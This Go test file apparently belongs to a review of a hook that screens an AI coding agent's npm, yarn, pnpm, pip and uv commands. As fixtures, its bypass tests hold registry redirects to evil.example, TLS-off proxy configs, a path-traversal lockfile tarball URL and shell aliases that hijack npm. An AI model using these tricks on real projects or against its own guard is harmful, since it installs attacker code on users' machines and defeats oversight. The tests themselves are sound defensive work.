//go:build unix

package main

// Independent re-review of 7b8cd53 (REPO-POL-NPMRC round 3, ADR-0174 round 8), 2026-11-15: proof tests. A failing
// case is a finding. Bypasses are on the exception path (exceptionPath) and must not be silent; false holds are
// ordinary lines on which nothing moves and must be silent.

import (
	"os"
	"path/filepath"
	"testing"
)

func TestR3ReviewLineBypasses(t *testing.T) {
	// R1: npm takes a String option's value as "" when the next word is an option (nopt; npm 10.8.2:
	// `npm config get prefix save-prefix --save-prefix --prefix /tmp/x` gives prefix=/tmp/x, save-prefix=), so the
	// word plainFlags skips as the value is npm's next option
	for _, command := range []string{
		"npm i @acme/cli --save-prefix --prefix /srv",
		"npm i @acme/cli --save-prefix --offline",
	} {
		exceptionPath(t, command)
		_, _, cwd := npmWorkspace(t)
		if form, stderr := round7(t, cwd, command, nil); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", command, stderr)
		}
	}
	// R2: a sourced activate script is the agent's file like any other: ParseLine reads it as harmless, and it can set
	// the registry or the index
	for _, c := range []struct{ name, body, command string }{
		{"npm after an activate script", "export npm_config_registry=https://evil.example/\n", "npm i @acme/cli"},
		{"pip after an activate script", "export PIP_INDEX_URL=https://evil.example/simple\n", "pip install acme-tools"},
	} {
		_, _, cwd := npmWorkspace(t)
		venv := t.TempDir()
		mkdir(t, filepath.Join(venv, "bin"))
		write(t, filepath.Join(venv, "bin", "activate"), c.body)
		command := ". " + filepath.Join(venv, "bin", "activate") + " && " + c.command
		exceptionPath(t, command)
		if form, stderr := round7(t, cwd, command, nil); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
}

func TestR3ReviewProjectBypasses(t *testing.T) {
	// R3: without a version, registryTarball takes any path under /<name>/-/<base>- that ends in .tgz; Node's URL
	// parser removes the dot segments, so the tarball fetched is another package's. Yarn 1 does not care about the
	// order of a block's keys.
	dots := "https://registry.npmjs.org/@acme/cli/-/cli-0/../../../evil-pkg/-/evil-pkg-1.0.0.tgz"
	for _, c := range []struct{ name, file, body, command string }{
		{"package-lock without a version", "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"dependencies":{"@acme/cli":"^1.0.0"}},"node_modules/@acme/cli":{"resolved":"` + dots + `","integrity":"sha512-AAAA"}}}`, "npm i @acme/cli"},
		{"yarn.lock 1, resolved before version", "yarn.lock", "# yarn lockfile v1\n\n\"@acme/cli@^1.0.0\":\n  resolved \"" + dots + "\"\n  version \"1.0.0\"\n", "yarn add @acme/cli"},
		// R4: TLS turned off (or a proxy with it) in a config file: the registry is the public one by name, the bytes
		// are the proxy's. The same settings on the line are held already (NODE_TLS_REJECT_UNAUTHORIZED=0,
		// PIP_TRUSTED_HOST, UV_INSECURE_HOST).
		{"npm strict-ssl off", ".npmrc", "strict-ssl=false\nhttps-proxy=http://evil.example:8080/\n", "npm i @acme/cli"},
		{"Yarn strict SSL off", ".yarnrc.yml", "enableStrictSsl: false\nhttpsProxy: http://evil.example:8080\n", "yarn add @acme/cli"},
		{"pnpm strict-ssl off", "pnpm-workspace.yaml", "strictSsl: false\nhttpsProxy: http://evil.example:8080\n", "pnpm add @acme/cli"},
		{"direnv TLS off", ".envrc", "export NODE_TLS_REJECT_UNAUTHORIZED=0\nexport HTTPS_PROXY=http://evil.example:8080\n", "npm i @acme/cli"},
		{"uv insecure hosts", "uv.toml", "allow-insecure-host = [\"pypi.org\", \"files.pythonhosted.org\"]\n", "uv add acme-tools"},
		{"pip trusted hosts", "pip.conf", "[global]\ntrusted-host = pypi.org files.pythonhosted.org\nproxy = http://evil.example:8080\n", "pip install acme-tools"},
	} {
		exceptionPath(t, c.command)
		_, root, cwd := npmWorkspace(t)
		p := filepath.Join(root, c.file)
		if c.file == "pip.conf" { // a venv's site config, where pip reads one in the workspace
			mkdir(t, filepath.Join(cwd, ".venv"))
			write(t, filepath.Join(cwd, ".venv", "pyvenv.cfg"), "home = /usr/bin\n")
			p = filepath.Join(cwd, ".venv", "pip.conf")
		}
		write(t, p, c.body)
		if form, stderr := round7(t, cwd, c.command, nil); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
}

func TestR3ReviewStartupAliases(t *testing.T) {
	// R5: zsh reads .zshenv (and a login shell .zprofile) for every -c, and expands aliases there; a function shadows
	// the program. Claude Code's shell snapshot keeps both.
	for _, c := range []struct{ name, file, body string }{
		{"an alias in .zshenv", ".zshenv", "alias npm='npm --registry=https://evil.example/'\n"},
		{"a function in .zprofile", ".zprofile", "npm() { command npm --userconfig /srv/npmrc \"$@\"; }\n"},
	} {
		_, _, cwd := npmWorkspace(t)
		home := t.TempDir()
		write(t, filepath.Join(home, c.file), c.body)
		if form, stderr := round7(t, cwd, "npm i @acme/cli", npmrcFiles(t, "", home, nil, nil)); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
	// and the alias most Python users have stays silent
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	write(t, filepath.Join(home, ".zshrc"), "alias pip=pip3\nalias python=python3\n")
	if form, stderr := round7(t, cwd, "pip install acme-tools", npmrcFiles(t, "", home, nil, nil)); form != "silent" {
		t.Errorf("alias pip=pip3: %s, want silent (stderr %q)", form, stderr)
	}
}

// F6: mise's global config is the user's own file, which dotfile managers link like the others F3 follows
func TestR3ReviewLinkedMiseConfig(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	mkdir(t, filepath.Join(home, "dotfiles"))
	mkdir(t, filepath.Join(home, ".config", "mise"))
	write(t, filepath.Join(home, "dotfiles", "mise.toml"), "[tools]\nnode = \"22\"\n")
	if err := os.Symlink(filepath.Join(home, "dotfiles", "mise.toml"), filepath.Join(home, ".config", "mise", "config.toml")); err != nil {
		t.Fatal(err)
	}
	if form, stderr := round7(t, cwd, "npm i @acme/cli", npmrcFiles(t, "", home, nil, nil)); form != "silent" {
		t.Errorf("a linked mise config: %s, want silent (stderr %q)", form, stderr)
	}
}

func TestR3ReviewFalseHolds(t *testing.T) {
	// F4: what follows the package of a run tool is the tool's own arguments (npx: "all flags and options must be set
	// prior to any positional arguments"; uvx, bunx, pnpm dlx, yarn dlx, pipx run, uv tool run alike), not the package
	// manager's options. MCP servers are launched this way.
	// F5: uv run --with is uv's plain way to run with a package.
	for _, command := range []string{
		"uvx acme-tools --help",
		"uvx acme-tools serve --port 8080",
		"uv tool run acme-tools --help",
		"pipx run acme-tools --help",
		"npx @acme/cli build --watch",
		"npx -y @acme/cli@latest init --template next",
		"bunx @acme/cli --help",
		"pnpm dlx @acme/cli --help",
		"yarn dlx @acme/cli --help",
		"uv run --with acme-tools python x.py",
	} {
		exceptionPath(t, command)
		_, _, cwd := npmWorkspace(t)
		if form, stderr := round7(t, cwd, command, nil); form != "silent" {
			t.Errorf("%s: %s, want silent (stderr %q)", command, form, stderr)
		}
	}
	// a standard venv activate script (CPython 3.12's) stays silent. Round 11 (ADR-0174) accepts a sourced script only
	// as a known template, so the control writes CPython 3.12.14's own (activate/) instead of an excerpt of it.
	_, _, cwd := npmWorkspace(t)
	venv := filepath.Join(cwd, ".venv")
	mkdir(t, filepath.Join(venv, "bin"))
	write(t, filepath.Join(venv, "pyvenv.cfg"), "home = /usr/bin\n")
	write(t, filepath.Join(venv, "bin", "activate"), activateFrom(t, "cpython-3.12.14", venv, ".venv"))
	command := "source .venv/bin/activate && pip install acme-tools"
	exceptionPath(t, command)
	if form, stderr := round7(t, cwd, command, nil); form != "silent" {
		t.Errorf("a standard activate script: %s, want silent (stderr %q)", form, stderr)
	}
}
